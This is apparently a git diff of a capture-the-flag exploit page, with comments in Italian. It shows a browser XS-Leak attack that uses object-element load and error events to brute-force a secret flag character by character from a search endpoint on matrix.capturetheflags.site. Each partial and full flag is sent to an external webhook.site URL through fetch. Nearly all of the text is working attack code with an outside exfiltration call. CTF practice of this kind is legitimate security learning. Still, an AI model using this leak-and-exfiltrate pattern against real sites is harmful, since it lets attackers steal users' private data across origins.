@@ -20,30 +20,22 @@
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";
+        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"; // Caratteri possibili
 
-        // Funzione per testare l'accessibilità di una risorsa con timeout
+        // Funzione per testare l'accessibilità di una risorsa
         const leak = (url) => {
             return new Promise((resolve) => {
                 const s = document.createElement('object');
                 s.data = url;
-                let timeout;
 
-                s.onload = () => {
-                    clearTimeout(timeout);
+                s.onload = () => { 
                     s.remove();
                     resolve(true); // Risorsa accessibile (status 200)
                 };
-                s.onerror = () => {
-                    clearTimeout(timeout);
-                    s.remove();
+                s.onerror = () => { 
+                    s.remove(); 
                     resolve(false); // Risorsa non accessibile (status 404 o errore)
                 };
-
-                timeout = setTimeout(() => {
-                    s.remove();
-                    resolve(false); // Timeout: consideriamo la risorsa non accessibile
-                }, 5000); // Timeout di 5 secondi
 
                 document.body.appendChild(s);
             });
@@ -55,30 +47,42 @@
             const resultDiv = document.getElementById('result');
 
             while (!flag.endsWith("}")) {
-                for (const char of charset) {
-                    const testFlag = `${flag}${char}`;
-                    const url = `https://matrix.capturetheflags.site/search?s=${testFlag}`;
-                    const accessible = await leak(url);
+                let found = false; // Variabile per tracciare se un carattere è stato trovato
 
-                    if (accessible) {
-                        flag += char;
-                        resultDiv.textContent = `Flag trovata finora: ${flag}`;
-                        logResult(`Flag parziale: ${flag}`);
-                        break;
+                for (const char of charset) {
+                    const testFlag = `${flag}${char}`; // Prova con il carattere attuale
+                    const url = `https://matrix.capturetheflags.site/search?s=${testFlag}`; 
+                    const accessible = await leak(url); // Controlla l'accessibilità
+
+                    if (accessible) { // Se la risorsa è accessibile
+                        flag += char; // Aggiungi il carattere alla flag
+                        resultDiv.textContent = `Flag trovata finora: ${flag}`; // Mostra l'attuale flag parziale
+                        await logResult(`Flag parziale: ${flag}`); // Log del progresso
+                        found = true; // Imposta che è stato trovato un carattere
+                        break; // Esci dal ciclo per passare al prossimo carattere
                     }
+                }
+
+                if (!found) {
+                    console.log('Nessun carattere trovato, potrebbe essere un problema.'); // Opzionale: messaggio di avviso
+                    break; // Interrompe il ciclo se non viene trovato alcun carattere
                 }
             }
 
-            resultDiv.textContent = `Flag completa trovata: ${flag}`;
-            logResult(`Flag completa trovata: ${flag}`);
+            if (flag.endsWith("}")) {
+                resultDiv.textContent = `Flag completa trovata: ${flag}`; // Mostra la flag finale
+                await logResult(`Flag completa trovata: ${flag}`); // Log della flag completa
+            } else {
+                resultDiv.textContent = 'La ricerca della flag è stata interrotta. Verifica il server.'; // Messaggio di errore
+            }
         };
 
         // Funzione per inviare il log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad';
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL per il logging
             try {
-                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                await fetch(urlWithParams, { method: 'GET' });
+                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`; // Parametrizza il messaggio
+                await fetch(urlWithParams, { method: 'GET' }); // Invia il log
                 console.log('Log inviato con successo');
             } catch (error) {
                 console.error('Errore di rete:', error);
